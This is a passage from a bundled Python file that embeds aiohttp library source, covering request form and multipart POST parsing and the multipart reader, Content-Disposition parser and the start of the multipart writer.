not in (\r\n            "",\r\n            "application/x-www-form-urlencoded",\r\n            "multipart/form-data",\r\n        ):\r\n            self._post = MultiDictProxy(MultiDict())\r\n            return self._post\r\n\r\n        out = MultiDict()  # type: MultiDict[Union[str, bytes, FileField]]\r\n\r\n        if content_type == "multipart/form-data":\r\n            multipart = await self.multipart()\r\n            max_size = self._client_max_size\r\n\r\n            field = await multipart.next()\r\n            while field is not None:\r\n                size = 0\r\n                field_ct = field.headers.get(hdrs.CONTENT_TYPE)\r\n\r\n                if isinstance(field, BodyPartReader):\r\n                    assert field.name is not None\r\n\r\n                    # Note that according to RFC 7578, the Content-Type header\r\n                    # is optional, even for files, so we can\'t assume it\'s\r\n                    # present.\r\n                    # https://tools.ietf.org/html/rfc7578#section-4.4\r\n                    if field.filename:\r\n                        # store file in temp file\r\n                        tmp = tempfile.TemporaryFile()\r\n                        chunk = await field.read_chunk(size=2 ** 16)\r\n                        while chunk:\r\n                            chunk = field.decode(chunk)\r\n                            tmp.write(chunk)\r\n                            size += len(chunk)\r\n                            if 0 < max_size < size:\r\n                                tmp.close()\r\n                                raise HTTPRequestEntityTooLarge(\r\n                                    max_size=max_size, actual_size=size\r\n                                )\r\n                            chunk = await field.read_chunk(size=2 ** 16)\r\n                        tmp.seek(0)\r\n\r\n                        if field_ct is None:\r\n                            field_ct = "application/octet-stream"\r\n\r\n                        ff = FileField(\r\n                            field.name,\r\n                            field.filename,\r\n                            cast(io.BufferedReader, tmp),\r\n                            field_ct,\r\n                            field.headers,\r\n                        )\r\n                        out.add(field.name, ff)\r\n                    else:\r\n                        # deal with ordinary data\r\n                        value = await field.read(decode=True)\r\n                        if field_ct is None or field_ct.startswith("text/"):\r\n                            charset = field.get_charset(default="utf-8")\r\n                            out.add(field.name, value.decode(charset))\r\n                        else:\r\n                            out.add(field.name, value)\r\n                        size += len(value)\r\n                        if 0 < max_size < size:\r\n                            raise HTTPRequestEntityTooLarge(\r\n                                max_size=max_size, actual_size=size\r\n                            )\r\n                else:\r\n                    raise ValueError(\r\n                        "To decode nested multipart you need " "to use custom reader",\r\n                    )\r\n\r\n                field = await multipart.next()\r\n        else:\r\n            data = await self.read()\r\n            if data:\r\n                charset = self.charset or "utf-8"\r\n                out.extend(\r\n                    parse_qsl(\r\n                        data.rstrip().decode(charset),\r\n                        keep_blank_values=True,\r\n                        encoding=charset,\r\n                    )\r\n                )\r\n\r\n        self._post = MultiDictProxy(out)\r\n        return self._post\r\n\r\n    def get_extra_info(self, name: str, default: Any = None) -> Any:\r\n        """Extra info from protocol transport"""\r\n        protocol = self._protocol\r\n        if protocol is None:\r\n            return default\r\n\r\n        transport = protocol.transport\r\n        if transport is None:\r\n            return default\r\n\r\n        return transport.get_extra_info(name, default)\r\n\r\n    def __repr__(self) -> str:\r\n        ascii_encodable_path = self.path.encode("ascii", "backslashreplace").decode(\r\n            "ascii"\r\n        )\r\n        return "<{} {} {} >".format(\r\n            self.__class__.__name__, self._method, ascii_encodable_path\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        return id(self) == id(other)\r\n\r\n    def __bool__(self) -> bool:\r\n        return True\r\n\r\n    async def _prepare_hook(self, response: StreamResponse) -> None:\r\n        return\r\n\r\n    def _cancel(self, exc: BaseException) -> None:\r\n        self._payload.set_exception(exc)\r\n\r\n\r\nclass Request(BaseRequest):\r\n\r\n    ATTRS = BaseRequest.ATTRS | frozenset(["_match_info"])\r\n\r\n    def __init__(self, *args: Any, **kwargs: Any) -> None:\r\n        super().__init__(*args, **kwargs)\r\n\r\n        # matchdict, route_name, handler\r\n        # or information about traversal lookup\r\n\r\n        # initialized after route resolving\r\n        self._match_info = None  # type: Optional[UrlMappingMatchInfo]\r\n\r\n    if DEBUG:\r\n\r\n        def __setattr__(self, name: str, val: Any) -> None:\r\n            if name not in self.ATTRS:\r\n                warnings.warn(\r\n                    "Setting custom {}.{} attribute "\r\n                    "is discouraged".format(self.__class__.__name__, name),\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n            super().__setattr__(name, val)\r\n\r\n    def clone(\r\n        self,\r\n        *,\r\n        method: str = sentinel,\r\n        rel_url: StrOrURL = sentinel,\r\n        headers: LooseHeaders = sentinel,\r\n        scheme: str = sentinel,\r\n        host: str = sentinel,\r\n        remote: str = sentinel,\r\n    ) -> "Request":\r\n        ret = super().clone(\r\n            method=method,\r\n            rel_url=rel_url,\r\n            headers=headers,\r\n            scheme=scheme,\r\n            host=host,\r\n            remote=remote,\r\n        )\r\n        new_ret = cast(Request, ret)\r\n        new_ret._match_info = self._match_info\r\n        return new_ret\r\n\r\n    @reify\r\n    def match_info(self) -> "UrlMappingMatchInfo":\r\n        """Result of route resolving."""\r\n        match_info = self._match_info\r\n        assert match_info is not None\r\n        return match_info\r\n\r\n    @property\r\n    def app(self) -> "Application":\r\n        """Application instance."""\r\n        match_info = self._match_info\r\n        assert match_info is not None\r\n        return match_info.current_app\r\n\r\n    @property\r\n    def config_dict(self) -> ChainMapProxy:\r\n        match_info = self._match_info\r\n        assert match_info is not None\r\n        lst = match_info.apps\r\n        app = self.app\r\n        idx = lst.index(app)\r\n        sublist = list(reversed(lst[: idx + 1]))\r\n        return ChainMapProxy(sublist)\r\n\r\n    async def _prepare_hook(self, response: StreamResponse) -> None:\r\n        match_info = self._match_info\r\n        if match_info is None:\r\n            return\r\n        for app in match_info._apps:\r\n            await app.on_response_prepare.send(self, response)\r\n')
    __stickytape_write_module('aiohttp/multipart.py', b'import base64\r\nimport binascii\r\nimport json\r\nimport re\r\nimport uuid\r\nimport warnings\r\nimport zlib\r\nfrom collections import deque\r\nfrom types import TracebackType\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    AsyncIterator,\r\n    Deque,\r\n    Dict,\r\n    Iterator,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Sequence,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\nfrom urllib.parse import parse_qsl, unquote, urlencode\r\n\r\nfrom multidict import CIMultiDict, CIMultiDictProxy, MultiMapping\r\n\r\nfrom .hdrs import (\r\n    CONTENT_DISPOSITION,\r\n    CONTENT_ENCODING,\r\n    CONTENT_LENGTH,\r\n    CONTENT_TRANSFER_ENCODING,\r\n    CONTENT_TYPE,\r\n)\r\nfrom .helpers import CHAR, TOKEN, parse_mimetype, reify\r\nfrom .http import HeadersParser\r\nfrom .payload import (\r\n    JsonPayload,\r\n    LookupError,\r\n    Order,\r\n    Payload,\r\n    StringPayload,\r\n    get_payload,\r\n    payload_type,\r\n)\r\nfrom .streams import StreamReader\r\n\r\n__all__ = (\r\n    "MultipartReader",\r\n    "MultipartWriter",\r\n    "BodyPartReader",\r\n    "BadContentDispositionHeader",\r\n    "BadContentDispositionParam",\r\n    "parse_content_disposition",\r\n    "content_disposition_filename",\r\n)\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .client_reqrep import ClientResponse\r\n\r\n\r\nclass BadContentDispositionHeader(RuntimeWarning):\r\n    pass\r\n\r\n\r\nclass BadContentDispositionParam(RuntimeWarning):\r\n    pass\r\n\r\n\r\ndef parse_content_disposition(\r\n    header: Optional[str],\r\n) -> Tuple[Optional[str], Dict[str, str]]:\r\n    def is_token(string: str) -> bool:\r\n        return bool(string) and TOKEN >= set(string)\r\n\r\n    def is_quoted(string: str) -> bool:\r\n        return string[0] == string[-1] == \'"\'\r\n\r\n    def is_rfc5987(string: str) -> bool:\r\n        return is_token(string) and string.count("\'") == 2\r\n\r\n    def is_extended_param(string: str) -> bool:\r\n        return string.endswith("*")\r\n\r\n    def is_continuous_param(string: str) -> bool:\r\n        pos = string.find("*") + 1\r\n        if not pos:\r\n            return False\r\n        substring = string[pos:-1] if string.endswith("*") else string[pos:]\r\n        return substring.isdigit()\r\n\r\n    def unescape(text: str, *, chars: str = "".join(map(re.escape, CHAR))) -> str:\r\n        return re.sub(f"\\\\\\\\([{chars}])", "\\\\1", text)\r\n\r\n    if not header:\r\n        return None, {}\r\n\r\n    disptype, *parts = header.split(";")\r\n    if not is_token(disptype):\r\n        warnings.warn(BadContentDispositionHeader(header))\r\n        return None, {}\r\n\r\n    params = {}  # type: Dict[str, str]\r\n    while parts:\r\n        item = parts.pop(0)\r\n\r\n        if "=" not in item:\r\n            warnings.warn(BadContentDispositionHeader(header))\r\n            return None, {}\r\n\r\n        key, value = item.split("=", 1)\r\n        key = key.lower().strip()\r\n        value = value.lstrip()\r\n\r\n        if key in params:\r\n            warnings.warn(BadContentDispositionHeader(header))\r\n            return None, {}\r\n\r\n        if not is_token(key):\r\n            warnings.warn(BadContentDispositionParam(item))\r\n            continue\r\n\r\n        elif is_continuous_param(key):\r\n            if is_quoted(value):\r\n                value = unescape(value[1:-1])\r\n            elif not is_token(value):\r\n                warnings.warn(BadContentDispositionParam(item))\r\n                continue\r\n\r\n        elif is_extended_param(key):\r\n            if is_rfc5987(value):\r\n                encoding, _, value = value.split("\'", 2)\r\n                encoding = encoding or "utf-8"\r\n            else:\r\n                warnings.warn(BadContentDispositionParam(item))\r\n                continue\r\n\r\n            try:\r\n                value = unquote(value, encoding, "strict")\r\n            except UnicodeDecodeError:  # pragma: nocover\r\n                warnings.warn(BadContentDispositionParam(item))\r\n                continue\r\n\r\n        else:\r\n            failed = True\r\n            if is_quoted(value):\r\n                failed = False\r\n                value = unescape(value[1:-1].lstrip("\\\\/"))\r\n            elif is_token(value):\r\n                failed = False\r\n            elif parts:\r\n                # maybe just ; in filename, in any case this is just\r\n                # one case fix, for proper fix we need to redesign parser\r\n                _value = f"{value};{parts[0]}"\r\n                if is_quoted(_value):\r\n                    parts.pop(0)\r\n                    value = unescape(_value[1:-1].lstrip("\\\\/"))\r\n                    failed = False\r\n\r\n            if failed:\r\n                warnings.warn(BadContentDispositionHeader(header))\r\n                return None, {}\r\n\r\n        params[key] = value\r\n\r\n    return disptype.lower(), params\r\n\r\n\r\ndef content_disposition_filename(\r\n    params: Mapping[str, str], name: str = "filename"\r\n) -> Optional[str]:\r\n    name_suf = "%s*" % name\r\n    if not params:\r\n        return None\r\n    elif name_suf in params:\r\n        return params[name_suf]\r\n    elif name in params:\r\n        return params[name]\r\n    else:\r\n        parts = []\r\n        fnparams = sorted(\r\n            (key, value) for key, value in params.items() if key.startswith(name_suf)\r\n        )\r\n        for num, (key, value) in enumerate(fnparams):\r\n            _, tail = key.split("*", 1)\r\n            if tail.endswith("*"):\r\n                tail = tail[:-1]\r\n            if tail == str(num):\r\n                parts.append(value)\r\n            else:\r\n                break\r\n        if not parts:\r\n            return None\r\n        value = "".join(parts)\r\n        if "\'" in value:\r\n            encoding, _, value = value.split("\'", 2)\r\n            encoding = encoding or "utf-8"\r\n            return unquote(value, encoding, "strict")\r\n        return value\r\n\r\n\r\nclass MultipartResponseWrapper:\r\n    """Wrapper around the MultipartReader.\r\n\r\n    It takes care about\r\n    underlying connection and close it when it needs in.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        resp: "ClientResponse",\r\n        stream: "MultipartReader",\r\n    ) -> None:\r\n        self.resp = resp\r\n        self.stream = stream\r\n\r\n    def __aiter__(self) -> "MultipartResponseWrapper":\r\n        return self\r\n\r\n    async def __anext__(\r\n        self,\r\n    ) -> Union["MultipartReader", "BodyPartReader"]:\r\n        part = await self.next()\r\n        if part is None:\r\n            raise StopAsyncIteration\r\n        return part\r\n\r\n    def at_eof(self) -> bool:\r\n        """Returns True when all response data had been read."""\r\n        return self.resp.content.at_eof()\r\n\r\n    async def next(\r\n        self,\r\n    ) -> Optional[Union["MultipartReader", "BodyPartReader"]]:\r\n        """Emits next multipart reader object."""\r\n        item = await self.stream.next()\r\n        if self.stream.at_eof():\r\n            await self.release()\r\n        return item\r\n\r\n    async def release(self) -> None:\r\n        """Release the connection gracefully.\r\n\r\n        All remaining content is read to the void.\r\n        """\r\n        await self.resp.release()\r\n\r\n\r\nclass BodyPartReader:\r\n    """Multipart reader for single body part."""\r\n\r\n    chunk_size = 8192\r\n\r\n    def __init__(\r\n        self, boundary: bytes, headers: "CIMultiDictProxy[str]", content: StreamReader\r\n    ) -> None:\r\n        self.headers = headers\r\n        self._boundary = boundary\r\n        self._content = content\r\n        self._at_eof = False\r\n        length = self.headers.get(CONTENT_LENGTH, None)\r\n        self._length = int(length) if length is not None else None\r\n        self._read_bytes = 0\r\n        # TODO: typeing.Deque is not supported by Python 3.5\r\n        self._unread: Deque[bytes] = deque()\r\n        self._prev_chunk = None  # type: Optional[bytes]\r\n        self._content_eof = 0\r\n        self._cache = {}  # type: Dict[str, Any]\r\n\r\n    def __aiter__(self) -> AsyncIterator["BodyPartReader"]:\r\n        return self  # type: ignore[return-value]\r\n\r\n    async def __anext__(self) -> bytes:\r\n        part = await self.next()\r\n        if part is None:\r\n            raise StopAsyncIteration\r\n        return part\r\n\r\n    async def next(self) -> Optional[bytes]:\r\n        item = await self.read()\r\n        if not item:\r\n            return None\r\n        return item\r\n\r\n    async def read(self, *, decode: bool = False) -> bytes:\r\n        """Reads body part data.\r\n\r\n        decode: Decodes data following by encoding\r\n                method from Content-Encoding header. If it missed\r\n                data remains untouched\r\n        """\r\n        if self._at_eof:\r\n            return b""\r\n        data = bytearray()\r\n        while not self._at_eof:\r\n            data.extend(await self.read_chunk(self.chunk_size))\r\n        if decode:\r\n            return self.decode(data)\r\n        return data\r\n\r\n    async def read_chunk(self, size: int = chunk_size) -> bytes:\r\n        """Reads body part content chunk of the specified size.\r\n\r\n        size: chunk size\r\n        """\r\n        if self._at_eof:\r\n            return b""\r\n        if self._length:\r\n            chunk = await self._read_chunk_from_length(size)\r\n        else:\r\n            chunk = await self._read_chunk_from_stream(size)\r\n\r\n        self._read_bytes += len(chunk)\r\n        if self._read_bytes == self._length:\r\n            self._at_eof = True\r\n        if self._at_eof:\r\n            clrf = await self._content.readline()\r\n            assert (\r\n                b"\\r\\n" == clrf\r\n            ), "reader did not read all the data or it is malformed"\r\n        return chunk\r\n\r\n    async def _read_chunk_from_length(self, size: int) -> bytes:\r\n        # Reads body part content chunk of the specified size.\r\n        # The body part must has Content-Length header with proper value.\r\n        assert self._length is not None, "Content-Length required for chunked read"\r\n        chunk_size = min(size, self._length - self._read_bytes)\r\n        chunk = await self._content.read(chunk_size)\r\n        return chunk\r\n\r\n    async def _read_chunk_from_stream(self, size: int) -> bytes:\r\n        # Reads content chunk of body part with unknown length.\r\n        # The Content-Length header for body part is not necessary.\r\n        assert (\r\n            size >= len(self._boundary) + 2\r\n        ), "Chunk size must be greater or equal than boundary length + 2"\r\n        first_chunk = self._prev_chunk is None\r\n        if first_chunk:\r\n            self._prev_chunk = await self._content.read(size)\r\n\r\n        chunk = await self._content.read(size)\r\n        self._content_eof += int(self._content.at_eof())\r\n        assert self._content_eof < 3, "Reading after EOF"\r\n        assert self._prev_chunk is not None\r\n        window = self._prev_chunk + chunk\r\n        sub = b"\\r\\n" + self._boundary\r\n        if first_chunk:\r\n            idx = window.find(sub)\r\n        else:\r\n            idx = window.find(sub, max(0, len(self._prev_chunk) - len(sub)))\r\n        if idx >= 0:\r\n            # pushing boundary back to content\r\n            with warnings.catch_warnings():\r\n                warnings.filterwarnings("ignore", category=DeprecationWarning)\r\n                self._content.unread_data(window[idx:])\r\n            if size > idx:\r\n                self._prev_chunk = self._prev_chunk[:idx]\r\n            chunk = window[len(self._prev_chunk) : idx]\r\n            if not chunk:\r\n                self._at_eof = True\r\n        result = self._prev_chunk\r\n        self._prev_chunk = chunk\r\n        return result\r\n\r\n    async def readline(self) -> bytes:\r\n        """Reads body part by line by line."""\r\n        if self._at_eof:\r\n            return b""\r\n\r\n        if self._unread:\r\n            line = self._unread.popleft()\r\n        else:\r\n            line = await self._content.readline()\r\n\r\n        if line.startswith(self._boundary):\r\n            # the very last boundary may not come with \\r\\n,\r\n            # so set single rules for everyone\r\n            sline = line.rstrip(b"\\r\\n")\r\n            boundary = self._boundary\r\n            last_boundary = self._boundary + b"--"\r\n            # ensure that we read exactly the boundary, not something alike\r\n            if sline == boundary or sline == last_boundary:\r\n                self._at_eof = True\r\n                self._unread.append(line)\r\n                return b""\r\n        else:\r\n            next_line = await self._content.readline()\r\n            if next_line.startswith(self._boundary):\r\n                line = line[:-2]  # strip CRLF but only once\r\n            self._unread.append(next_line)\r\n\r\n        return line\r\n\r\n    async def release(self) -> None:\r\n        """Like read(), but reads all the data to the void."""\r\n        if self._at_eof:\r\n            return\r\n        while not self._at_eof:\r\n            await self.read_chunk(self.chunk_size)\r\n\r\n    async def text(self, *, encoding: Optional[str] = None) -> str:\r\n        """Like read(), but assumes that body part contains text data."""\r\n        data = await self.read(decode=True)\r\n        # see https://www.w3.org/TR/html5/forms.html#multipart/form-data-encoding-algorithm # NOQA\r\n        # and https://dvcs.w3.org/hg/xhr/raw-file/tip/Overview.html#dom-xmlhttprequest-send # NOQA\r\n        encoding = encoding or self.get_charset(default="utf-8")\r\n        return data.decode(encoding)\r\n\r\n    async def json(self, *, encoding: Optional[str] = None) -> Optional[Dict[str, Any]]:\r\n        """Like read(), but assumes that body parts contains JSON data."""\r\n        data = await self.read(decode=True)\r\n        if not data:\r\n            return None\r\n        encoding = encoding or self.get_charset(default="utf-8")\r\n        return cast(Dict[str, Any], json.loads(data.decode(encoding)))\r\n\r\n    async def form(self, *, encoding: Optional[str] = None) -> List[Tuple[str, str]]:\r\n        """Like read(), but assumes that body parts contain form urlencoded data."""\r\n        data = await self.read(decode=True)\r\n        if not data:\r\n            return []\r\n        if encoding is not None:\r\n            real_encoding = encoding\r\n        else:\r\n            real_encoding = self.get_charset(default="utf-8")\r\n        return parse_qsl(\r\n            data.rstrip().decode(real_encoding),\r\n            keep_blank_values=True,\r\n            encoding=real_encoding,\r\n        )\r\n\r\n    def at_eof(self) -> bool:\r\n        """Returns True if the boundary was reached or False otherwise."""\r\n        return self._at_eof\r\n\r\n    def decode(self, data: bytes) -> bytes:\r\n        """Decodes data.\r\n\r\n        Decoding is done according the specified Content-Encoding\r\n        or Content-Transfer-Encoding headers value.\r\n        """\r\n        if CONTENT_TRANSFER_ENCODING in self.headers:\r\n            data = self._decode_content_transfer(data)\r\n        if CONTENT_ENCODING in self.headers:\r\n            return self._decode_content(data)\r\n        return data\r\n\r\n    def _decode_content(self, data: bytes) -> bytes:\r\n        encoding = self.headers.get(CONTENT_ENCODING, "").lower()\r\n\r\n        if encoding == "deflate":\r\n            return zlib.decompress(data, -zlib.MAX_WBITS)\r\n        elif encoding == "gzip":\r\n            return zlib.decompress(data, 16 + zlib.MAX_WBITS)\r\n        elif encoding == "identity":\r\n            return data\r\n        else:\r\n            raise RuntimeError(f"unknown content encoding: {encoding}")\r\n\r\n    def _decode_content_transfer(self, data: bytes) -> bytes:\r\n        encoding = self.headers.get(CONTENT_TRANSFER_ENCODING, "").lower()\r\n\r\n        if encoding == "base64":\r\n            return base64.b64decode(data)\r\n        elif encoding == "quoted-printable":\r\n            return binascii.a2b_qp(data)\r\n        elif encoding in ("binary", "8bit", "7bit"):\r\n            return data\r\n        else:\r\n            raise RuntimeError(\r\n                "unknown content transfer encoding: {}" "".format(encoding)\r\n            )\r\n\r\n    def get_charset(self, default: str) -> str:\r\n        """Returns charset parameter from Content-Type header or default."""\r\n        ctype = self.headers.get(CONTENT_TYPE, "")\r\n        mimetype = parse_mimetype(ctype)\r\n        return mimetype.parameters.get("charset", default)\r\n\r\n    @reify\r\n    def name(self) -> Optional[str]:\r\n        """Returns name specified in Content-Disposition header.\r\n\r\n        If the header is missing or malformed, returns None.\r\n        """\r\n        _, params = parse_content_disposition(self.headers.get(CONTENT_DISPOSITION))\r\n        return content_disposition_filename(params, "name")\r\n\r\n    @reify\r\n    def filename(self) -> Optional[str]:\r\n        """Returns filename specified in Content-Disposition header.\r\n\r\n        Returns None if the header is missing or malformed.\r\n        """\r\n        _, params = parse_content_disposition(self.headers.get(CONTENT_DISPOSITION))\r\n        return content_disposition_filename(params, "filename")\r\n\r\n\r\n@payload_type(BodyPartReader, order=Order.try_first)\r\nclass BodyPartReaderPayload(Payload):\r\n    def __init__(self, value: BodyPartReader, *args: Any, **kwargs: Any) -> None:\r\n        super().__init__(value, *args, **kwargs)\r\n\r\n        params = {}  # type: Dict[str, str]\r\n        if value.name is not None:\r\n            params["name"] = value.name\r\n        if value.filename is not None:\r\n            params["filename"] = value.filename\r\n\r\n        if params:\r\n            self.set_content_disposition("attachment", True, **params)\r\n\r\n    async def write(self, writer: Any) -> None:\r\n        field = self._value\r\n        chunk = await field.read_chunk(size=2 ** 16)\r\n        while chunk:\r\n            await writer.write(field.decode(chunk))\r\n            chunk = await field.read_chunk(size=2 ** 16)\r\n\r\n\r\nclass MultipartReader:\r\n    """Multipart body reader."""\r\n\r\n    #: Response wrapper, used when multipart readers constructs from response.\r\n    response_wrapper_cls = MultipartResponseWrapper\r\n    #: Multipart reader class, used to handle multipart/* body parts.\r\n    #: None points to type(self)\r\n    multipart_reader_cls = None\r\n    #: Body part reader class for non multipart/* content types.\r\n    part_reader_cls = BodyPartReader\r\n\r\n    def __init__(self, headers: Mapping[str, str], content: StreamReader) -> None:\r\n        self.headers = headers\r\n        self._boundary = ("--" + self._get_boundary()).encode()\r\n        self._content = content\r\n        self._last_part = (\r\n            None\r\n        )  # type: Optional[Union[\'MultipartReader\', BodyPartReader]]\r\n        self._at_eof = False\r\n        self._at_bof = True\r\n        self._unread = []  # type: List[bytes]\r\n\r\n    def __aiter__(\r\n        self,\r\n    ) -> AsyncIterator["BodyPartReader"]:\r\n        return self  # type: ignore[return-value]\r\n\r\n    async def __anext__(\r\n        self,\r\n    ) -> Optional[Union["MultipartReader", BodyPartReader]]:\r\n        part = await self.next()\r\n        if part is None:\r\n            raise StopAsyncIteration\r\n        return part\r\n\r\n    @classmethod\r\n    def from_response(\r\n        cls,\r\n        response: "ClientResponse",\r\n    ) -> MultipartResponseWrapper:\r\n        """Constructs reader instance from HTTP response.\r\n\r\n        :param response: :class:`~aiohttp.client.ClientResponse` instance\r\n        """\r\n        obj = cls.response_wrapper_cls(\r\n            response, cls(response.headers, response.content)\r\n        )\r\n        return obj\r\n\r\n    def at_eof(self) -> bool:\r\n        """Returns True if the final boundary was reached, false otherwise."""\r\n        return self._at_eof\r\n\r\n    async def next(\r\n        self,\r\n    ) -> Optional[Union["MultipartReader", BodyPartReader]]:\r\n        """Emits the next multipart body part."""\r\n        # So, if we\'re at BOF, we need to skip till the boundary.\r\n        if self._at_eof:\r\n            return None\r\n        await self._maybe_release_last_part()\r\n        if self._at_bof:\r\n            await self._read_until_first_boundary()\r\n            self._at_bof = False\r\n        else:\r\n            await self._read_boundary()\r\n        if self._at_eof:  # we just read the last boundary, nothing to do there\r\n            return None\r\n        self._last_part = await self.fetch_next_part()\r\n        return self._last_part\r\n\r\n    async def release(self) -> None:\r\n        """Reads all the body parts to the void till the final boundary."""\r\n        while not self._at_eof:\r\n            item = await self.next()\r\n            if item is None:\r\n                break\r\n            await item.release()\r\n\r\n    async def fetch_next_part(\r\n        self,\r\n    ) -> Union["MultipartReader", BodyPartReader]:\r\n        """Returns the next body part reader."""\r\n        headers = await self._read_headers()\r\n        return self._get_part_reader(headers)\r\n\r\n    def _get_part_reader(\r\n        self,\r\n        headers: "CIMultiDictProxy[str]",\r\n    ) -> Union["MultipartReader", BodyPartReader]:\r\n        """Dispatches the response by the `Content-Type` header.\r\n\r\n        Returns a suitable reader instance.\r\n\r\n        :param dict headers: Response headers\r\n        """\r\n        ctype = headers.get(CONTENT_TYPE, "")\r\n        mimetype = parse_mimetype(ctype)\r\n\r\n        if mimetype.type == "multipart":\r\n            if self.multipart_reader_cls is None:\r\n                return type(self)(headers, self._content)\r\n            return self.multipart_reader_cls(headers, self._content)\r\n        else:\r\n            return self.part_reader_cls(self._boundary, headers, self._content)\r\n\r\n    def _get_boundary(self) -> str:\r\n        mimetype = parse_mimetype(self.headers[CONTENT_TYPE])\r\n\r\n        assert mimetype.type == "multipart", "multipart/* content type expected"\r\n\r\n        if "boundary" not in mimetype.parameters:\r\n            raise ValueError(\r\n                "boundary missed for Content-Type: %s" % self.headers[CONTENT_TYPE]\r\n            )\r\n\r\n        boundary = mimetype.parameters["boundary"]\r\n        if len(boundary) > 70:\r\n            raise ValueError("boundary %r is too long (70 chars max)" % boundary)\r\n\r\n        return boundary\r\n\r\n    async def _readline(self) -> bytes:\r\n        if self._unread:\r\n            return self._unread.pop()\r\n        return await self._content.readline()\r\n\r\n    async def _read_until_first_boundary(self) -> None:\r\n        while True:\r\n            chunk = await self._readline()\r\n            if chunk == b"":\r\n                raise ValueError(\r\n                    "Could not find starting boundary %r" % (self._boundary)\r\n                )\r\n            chunk = chunk.rstrip()\r\n            if chunk == self._boundary:\r\n                return\r\n            elif chunk == self._boundary + b"--":\r\n                self._at_eof = True\r\n                return\r\n\r\n    async def _read_boundary(self) -> None:\r\n        chunk = (await self._readline()).rstrip()\r\n        if chunk == self._boundary:\r\n            pass\r\n        elif chunk == self._boundary + b"--":\r\n            self._at_eof = True\r\n            epilogue = await self._readline()\r\n            next_line = await self._readline()\r\n\r\n            # the epilogue is expected and then either the end of input or the\r\n            # parent multipart boundary, if the parent boundary is found then\r\n            # it should be marked as unread and handed to the parent for\r\n            # processing\r\n            if next_line[:2] == b"--":\r\n                self._unread.append(next_line)\r\n            # otherwise the request is likely missing an epilogue and both\r\n            # lines should be passed to the parent for processing\r\n            # (this handles the old behavior gracefully)\r\n            else:\r\n                self._unread.extend([next_line, epilogue])\r\n        else:\r\n            raise ValueError(f"Invalid boundary {chunk!r}, expected {self._boundary!r}")\r\n\r\n    async def _read_headers(self) -> "CIMultiDictProxy[str]":\r\n        lines = [b""]\r\n        while True:\r\n            chunk = await self._content.readline()\r\n            chunk = chunk.strip()\r\n            lines.append(chunk)\r\n            if not chunk:\r\n                break\r\n        parser = HeadersParser()\r\n        headers, raw_headers = parser.parse_headers(lines)\r\n        return headers\r\n\r\n    async def _maybe_release_last_part(self) -> None:\r\n        """Ensures that the last read body part is read completely."""\r\n        if self._last_part is not None:\r\n            if not self._last_part.at_eof():\r\n                await self._last_part.release()\r\n            self._unread.extend(self._last_part._unread)\r\n            self._last_part = None\r\n\r\n\r\n_Part = Tuple[Payload, str, str]\r\n\r\n\r\nclass MultipartWriter(Payload):\r\n    """Multipart body writer."""\r\n\r\n    def __init__(self, subtype: str = "mixed", boundary: Optional[str] = None) -> None:\r\n        boundary = boundary if boundary is not None else uuid.uuid4().hex\r\n        # The underlying Payload API demands a str (utf-8), not bytes,\r\n        # so we need to ensure we don\'t lose anything during conversion.\r\n        # As a result, require the boundary to be ASCII only.\r\n        # In both situations.\r\n\r\n        try:\r\n            self._boundary = boundary.encode("ascii")\r\n        except UnicodeEncodeError:\r\n            raise ValueError("boundary should contain ASCII only chars") from None\r\n        ctype = f"multipart/{subtype}; boundary={self._boundary_value}"\r\n\r\n        super().__init__(None, content_type=ctype)\r\n\r\n        self._parts = []  # type: List[_Part]\r\n\r\n    def __enter__(self) -> "MultipartWriter":\r\n        return self\r\n\r\n    def __exit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> None:\r\n        pass\r\n\r\n    def __iter__(self) -> Iterator[_Part]:\r\n        return iter(self._parts)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._parts)\r\n\r\n    def __bool__(self) -> bool:\r\n        return True\r\n\r\n    _valid_tchar_regex = re.compile(br"\\A[!#$%&\'*+\\-.^_`|~\\w]+\\Z")\r\n    _invalid_qdtext_char_regex = re.compile(br"[\\x00-\\x08\\x0A-\\x1F\\x7F]")\r\n\r\n    @property\r\n    def _boundary_value(self) -> str:\r\n        """Wrap boundary parameter value in quotes, if necessary.\r\n\r\n        Reads self.boundary and returns a unicode sting.\r\n        """\r\n        # Refer to RFCs 7231, 7230, 5234.\r\n        #\r\n        # parameter      = token "=" ( token / quoted-string )\r\n        # token          = 1*tchar\r\n        # quoted-string  = DQUOTE *( qdtext / quoted-pair ) DQUOTE\r\n        # qdtext         = HTAB / SP / %x21 / %x23-5B / %x5D-7E / obs-text\r\n        # obs-text       = %x80-FF\r\n        # quoted-pair    = "\\" ( HTAB / SP / VCHAR / obs-text )\r\n        # tchar          = "!" / "#" / "$" / "%" / "&" / "\'" / "*"\r\n        #                  / "+" / "-" / "." / "^" / "_" / "`" / "|" / "~"\r\n        #                  / DIGIT / ALPHA\r\n        #                  ; any VCHAR, except delimiters\r\n        # VCHAR           = %x21-7E\r\n        value = self._boundary\r\n        if re.match(self._valid_tchar_regex, value):\r\n            return value.decode("ascii")  # cannot fail\r\n\r\n        if re.search(self._invalid_qdtext_char_regex, value):\r\n            raise ValueError("boundary value contains invalid characters")\r\n\r\n        # escape %x5C and %x22\r\n        quoted_value_content = value.replace(b"\\\\", b"\\\\\\\\")\r\n        quoted_value_content = quoted_value_content.replace(b\'"\', b\'\\\\"\')\r\n\r\n        return \'"\' + quoted_value_content.decode("ascii") + \'"\'\r\n\r\n    @property\r\n    def boundary(self) -> str:\r\n        return self._boundary.decode("ascii")\r\n\r\n    def append(self, obj: Any, headers: Optional[MultiMapping[str]] = None) -> Payload:\r\n        if headers is None:\r\n            headers = CIMultiDict()\r\n\r\n        if isinstance(obj, Payload):\r\n            obj.headers.update(headers)\r\n            return self.append_payload(obj)\r\n        else:\r\n            try:\r\n                payload = get_payload(obj, headers=headers)\r\n            except LookupError:\r\n                raise TypeError("Cannot create payload from %r" % obj)\r\n            else:\r\n                return self.append_payload(payload)\r\n\r\n    def append_payload(self, payload: Payload) -> Payload:\r\n        """Adds a new 